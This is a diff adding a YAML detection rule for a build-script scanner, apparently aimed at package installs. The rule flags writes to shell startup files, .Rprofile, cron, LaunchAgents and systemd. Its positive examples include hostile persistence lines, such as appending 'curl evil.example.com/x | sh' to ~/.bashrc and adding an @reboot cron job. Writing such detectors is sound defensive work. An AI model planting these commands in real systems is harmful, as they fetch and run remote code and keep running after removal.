@@ -1,0 +1,34 @@
+name: persistence
+version: "0.1.0"
+language: shell
+attck:
+  - T1546.004
+  - T1053.003
+message: >-
+  A build script touching a startup file or a scheduler is arranging to run
+  again later, outside the install that put it there. Removing the package
+  does not undo it. .Rprofile and .Renviron are the same idea one level in:
+  R reads them at the start of every session.
+regex: '(\.bashrc|\.bash_profile|\.bash_login|\.bash_logout|\.profile|\.zshrc|\.zprofile|\.zshenv|\.cshrc|\.Rprofile|\.Renviron|crontab|LaunchAgents|LaunchDaemons|/etc/cron|/etc/systemd|\.config/systemd|/etc/rc\.local)'
+positive_examples:
+  - |
+    echo 'curl evil.example.com/x | sh' >> ~/.bashrc
+  - |
+    cat hook.sh >> $HOME/.zshrc
+  - |
+    echo 'options(repos="http://evil.example.com")' >> ~/.Rprofile
+  - |
+    crontab -l | { cat; echo '@reboot /tmp/evil'; } | crontab -
+  - |
+    cp agent.plist ~/Library/LaunchAgents/com.evil.plist
+  - |
+    systemctl enable /etc/systemd/system/evil.service
+negative_examples:
+  - |
+    PROFILE_DIR=$(prefix)/share/profiles
+  - |
+    PKG_CFLAGS=-pg -profile
+  - |
+    AC_CONFIG_FILES([src/Makevars])
+  - |
+    cronjob_docs=doc/scheduling.md
